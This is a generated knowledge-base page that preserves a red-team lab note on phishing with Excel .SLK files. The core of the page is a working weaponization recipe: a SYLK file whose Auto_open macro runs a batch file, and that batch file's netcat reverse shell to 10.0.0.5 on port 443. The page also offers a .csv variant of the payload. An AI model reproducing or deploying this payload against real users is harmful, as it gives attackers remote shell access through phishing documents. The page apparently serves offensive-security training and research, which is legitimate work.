---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Phishing: .SLK Excel

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-initial-access-phishing-with-ms-office-phishing-.slk-excel` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/initial-access/phishing-with-ms-office/phishing-.slk-excel.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

This lab is based on findings by @StanHacked - see below references for more info.

## Preserved Body

````markdown
This lab is based on findings by [@StanHacked](https://twitter.com/StanHacked) - see below references for more info.

## Weaponization

Create an new text file, put the the below code and save it as .slk file:
```csharp
ID;P
O;E
NN;NAuto_open;ER101C1;KOut Flank;F
C;X1;Y101;K0;EEXEC("c:\shell.cmd")
C;X1;Y102;K0;EHALT()
E
```
![](<../../../_assets/slk-text.png>)

Note that the shell.cmd refers to a simple nc reverse shell batch file:
```csharp
C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
```
## Execution

Once the macro warning is dismissed, the reverse shell pops as expected:

![](<../../../_assets/slk-shell.gif>)

Since the file is actually a plain text file, detecting/triaging malicious intents are made easier.

## Bonus

Note that the payload file could be saved as a .csv - note the additional warning though:

![](<../../../_assets/slk-csv.png>)

## References
[http://www.irongeek.com/i.php?page=videos/derbycon8/track-3-18-the-ms-office-magic-show-stan-hegt-pieter-ceelen](http://www.irongeek.com/i.php?page=videos/derbycon8/track-3-18-the-ms-office-magic-show-stan-hegt-pieter-ceelen)
````

## Source Verification

[source record](../../sources/redteamingtactics/phishing-.slk-excel.md)

## Evidence Excerpt

```text
_asset_filenames:
- slk-csv.png
- slk-shell.gif
- slk-text.png
_body: '# Phishing: .SLK Excel
This lab is based on findings by [@StanHacked](https://twitter.com/StanHacked) - see below references for more info.
## Weaponization
Create an new text file, put the the below code and save it as .slk file:
```
